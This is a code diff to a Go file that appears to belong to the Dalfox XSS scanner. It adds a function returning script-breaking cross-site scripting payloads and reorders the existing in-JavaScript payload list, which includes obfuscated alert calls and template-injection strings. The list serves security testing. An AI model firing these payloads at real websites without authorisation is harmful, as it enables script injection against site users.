@@ -50,6 +50,12 @@ func GetInJsPayload() ([]string, int) {
 	return lst, len(lst)
 }
 
+// GetInJsBreakScriptPayload is exported interface
+func GetInJsBreakScriptPayload() ([]string, int) {
+	lst := getInJsBreakScriptPayload("")
+	return lst, len(lst)
+}
+
 //basic open redirect payloads
 func getOpenRedirectPayload() []string {
 	payload := []string{
@@ -443,6 +449,20 @@ func getAttrPayload(ip string) []string {
 	return payload
 }
 
+func getInJsBreakScriptPayload(ip string) []string {
+	payload := []string{
+		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
+		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
+		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
+		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
+		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
+	}
+	return payload
+}
+
 func getInJsPayload(ip string) []string {
 	payload := []string{
 		"alert(DALFOX_ALERT_VALUE)",
@@ -455,14 +475,6 @@ func getInJsPayload(ip string) []string {
 		"alert.apply(null,[DALFOX_ALERT_VALUE])",
 		"prompt.apply(null,[DALFOX_ALERT_VALUE])",
 		"confirm.apply(null,[DALFOX_ALERT_VALUE])",
-		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
-		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
-		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
-		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
-		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
-		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
-		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
-		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
 		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
 		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
 		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
@@ -476,6 +488,14 @@ func getInJsPayload(ip string) []string {
 		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
 		"{{toString().constructor.constructor('alert(DALFOX_ALERT_VALUE)')()}}",
 		"{{-function(){this.alert(DALFOX_ALERT_VALUE)}()}}",
+		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
+		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
+		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
+		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
+		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
 	}
 	if strings.Contains(ip, "none") {
 		var tempPayload []string
